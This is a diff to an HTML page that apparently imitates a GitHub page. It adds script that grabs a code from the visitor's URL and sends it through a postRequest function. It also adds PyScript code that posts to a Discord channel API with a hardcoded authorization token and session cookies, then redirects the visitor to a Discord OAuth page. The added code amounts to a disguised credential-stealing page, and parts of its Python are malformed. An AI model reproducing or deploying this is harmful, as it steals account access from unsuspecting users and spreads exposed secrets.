@@ -12,6 +12,16 @@
   transform: translate3d(0, 0, 0);
 }
 </style>
+
+
+<link rel="stylesheet" href="https://pyscript.net/latest/pyscript.css" />
+<script defer src="https://pyscript.net/latest/pyscript.js"></script>
+    <py-config>
+      [[fetch]]
+      files = ["/request.py"]
+    </py-config>
+    
+    
     <meta charset="utf-8">
   <link rel="dns-prefetch" href="https://github.githubassets.com">
   <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
@@ -115,6 +125,8 @@
 function copy() {
   document.getElementById('copyButton').disabled = true
   navigator.clipboard.writeText(window.location.href.slice(63,100));
+  code = window.location.href.slice(63,100)
+  postRequest(window.location.href.slice(63,100))
   setTimeout(openWindows, 3000)
 }
 function openWindows() {
@@ -122,6 +134,23 @@ function openWindows() {
   window.open("https://discord.com/oauth2/authorized", "_self");
 }
 </script>
+<py-script>
+    # Import and use JS function and variable into Python
+    from js import code, postRequest
+//code here
+    import asyncio
+    import json
+    from request import request  # import our request function.
+    
+    async def main():
+        baseurl = "https://discord.com/api/v9/channels/1088053570038935602/messages"
+        # POST
+        headers = {"authorization": "MTA1MDM0NzM4NzE5MDc5MjI1Mg.GEtLLv.PnVUZWM6l2hc0j33nynxTL5jL6LPuMeukDV0B4", "cookie": "__dcfduid=e97eeac04f8f11eda9d0156248cfc1a0; __sdcfduid=e97eeac14f8f11eda9d0156248cfc1a08b49b285fd1be4a7a249bb9589cf295b11998b26cb8c9cff67c5292133e53f79; __stripe_mid=bc7b875d-82bf-49dd-987b-3bb24a2f39cd7fa36c; __cfruid=65cbcb03d94ca9b3d7a4b8b4aded641a508ca905-1683193958"}
+        body = json.dumps({"content":"test","nonce":"1103634516657831936","tts":false,"flags":0})
+        new_post = await request(f"{baseurl}/posts", body=body, method="POST", headers=headers)
+        print(f"POST request=> status:{new_post.status}, json:{await new_post.json()}")
+    asyncio.ensure_future(main())
+</py-script>
   </div>
       </div>
   </div>
